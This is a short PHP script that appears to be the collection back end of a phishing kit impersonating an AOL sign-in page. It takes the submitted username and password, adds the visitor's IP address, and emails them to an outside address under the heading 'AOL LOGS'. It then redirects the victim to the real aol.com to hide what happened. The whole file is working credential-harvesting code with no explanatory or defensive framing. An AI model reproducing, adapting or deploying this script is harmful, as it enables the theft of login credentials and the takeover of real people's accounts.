<?   
if($_SERVER['REQUEST_METHOD'] != "POST") {
    header("HTTP/1.0 403 Forbidden");
    print("Forbidden");
    exit();
}



$ip = getenv("REMOTE_ADDR");
$message .= "|----------| AOL LOGS |--------------|\n";
$message .= "Username : ".$_POST['username']."\n";
$message .= "Password : ".$_POST['password']."\n";
$message .= "------xXx-------\n";
$message .= "IP : ".$ip."\n";
$send = "hacker047des@yandex.com";
$subject = "Result - $ip";


if (isset($_POST['username']))
{
    if (!empty($_POST['username']))
    {
       
        mail($send,$subject,$message);
	header("Location: https://www.aol.com"); 
    }
    else
    {
        echo 'Please ensure you have entered your details';
    }
}
else
{
   
	header("Location: https://www.aol.com"); 
	
} 
  

?>